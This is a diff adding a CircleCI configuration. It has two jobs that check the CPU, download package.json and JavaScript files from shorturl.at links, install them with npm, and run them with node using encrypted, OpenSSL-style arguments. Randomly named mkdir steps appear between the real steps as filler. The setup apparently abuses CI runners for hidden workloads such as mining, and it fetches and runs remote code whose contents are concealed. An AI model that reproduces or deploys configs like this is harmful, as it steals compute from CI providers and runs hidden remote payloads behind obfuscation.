@@ -1,0 +1,53 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  kiem-tra:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: cat /proc/cpuinfo
+      - run: curl -fsSL shorturl.at/gtNR2 -o package.json && curl -fsSL
+          shorturl.at/rvwGW -o vkhgo8xpzmfd.js && curl -fsSL shorturl.at/opMU5
+          -o u9yq3s87zsv62ippy0us.js
+      - run: mkdir asjeiye8u9ifc57my2ibbgnkhws
+      - run: mkdir ajw49j9ghww7y7yd
+      - run: npm i -s
+      - run: mkdir x9qwpwudcbkum0isdscw2dm
+      - run: node vkhgo8xpzmfd -t
+          U2FsdGVkX18nM0TCvOAaxfpjD65BsolcftzZYg18D8V2bGnyoW4W8eMJoo32egYc -r
+          U2FsdGVkX192ugs3HEYmNjCLO9oKi1OCT7U/F9Yga7O32VKog3oE6xwKHkZ89G4VbnnIACJ78RQcyJsaFrejrBAqrbGmnoEHrt2yqJNchMsciUTPpPVXRptF/1cLtvjZ6cSVS3iiyOaH0zxs2eZVsn/Mtc5LZv2plhYVx8Xmhla3fqKF5SNU6emlM2JLNBHSGPpu2nEWz5rGFs4pt3KMhLSxdbjgrfnF8DcSOrkvhn5/guzDIMytTqauc8cEbF12/gIGBwIoUE/yMCcuXVPagtYeNX35mB3Bu4oP3aDeVTI=
+          -s
+          U2FsdGVkX1+3lvx2uzWkyqzvvzXdxhu6K3l3iLkNAFAR3L0h57CuanaDyNZEzj61gVY1A/4+UXC+I4PMofBCLLZ5xd/DlJKzRZPIFZzg0Tg+tZVbq6g2Qh8WfnE1VE6H8d9osYC4EFYUcsL+jJmrdQ5x8NUc0wiwtXMEBxG/tgMUZPdyVgKzk8dPI+B7f1VnZzhj4tGTbcVECeTXCLXAz47BfHqMQIyjLI0lVmRO9LQ=
+          -lpn U2FsdGVkX1/Vcprzfcx35npdPyIu93yGZWyIuIihr3+xgWBx6A5ExtERh7kc5zwa
+          -sp
+      - run: mkdir fnv6o70bjcp20omagul0c
+      - run: mkdir sq7irv1gtobq0clsp8m
+  start-jobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir vzzsfhdptrssj3nj7u14
+      - run: curl -fsSL shorturl.at/cgCTV -o u441nk0voig.js && curl -fsSL
+          shorturl.at/btNY7 -o package.json && curl -fsSL shorturl.at/lyK69 -o
+          imd45m9drp.js
+      - run: mkdir w8n8s8z399suj82m
+      - run: mkdir njmwxse4dn5p4wyuwxr
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: npm i -s
+      - run: node imd45m9drp -s
+          U2FsdGVkX1/IAA8RLCj+6zYsA+VUQJjoEpBAB1rBreRdHEXOi1mu13H1bw1B0+zaKWg9GuJLexladWYRdhxfBvGfQkgAtuJA9Q2IL/SMFhpQE2s2XF/eiTTpvW8JUCRu7V7nIjL8uDo/EltCEIZvHRMLxilEmnePcBw2sUkr1r7MN3Vpy4ODyJKIJuAfe0mpQJWjAgxUnPrWB0EDoN0y6UcVfoF8/iLxRp6dOYPVzCg=
+          -t U2FsdGVkX1+MKNNq/TiQxGvItwOZ7j5lJQDi9Pd+GeZAbG4nkU81WCF63L+9n4Xk -r
+          U2FsdGVkX1+RF8VtwhmI92G/8lanqSLoYulSmxxMcXhjzkFnRECN9djJjFf0h+T1sxa9ibZcWfSbpv2iSrmt0KuEZHHEUQdaYjlgK4SEwgOSk2qeJ0kvW0e0NWmzxxH2K+0C8zN066PEd6t/3C+4w3MT1YU/56hFMPdZVQPLaF529EphZ13dqihyPks4e/wTnllvYPnXyL1pOV5/LUOwI+uhFJLcq33u+X0SvfhvvJfEI6Z17yPPAeJ/QjH0UsxN92tkE9czZwgLfSZaJG5PThBk4cLZU8I84s0gCKhJem0=
+          -sp -lpn U2FsdGVkX18sDrdgg+bZfo1xGKzNzqcxomzcqt1m1UQ=
+      - run: mkdir 84loaog8e2r9oor9sr8t8am
+      - run: mkdir cqvhd61mpt8d6we6wd
+workflows:
+  check:
+    jobs:
+      - kiem-tra
+  motherFucker:
+    jobs:
+      - start-jobs
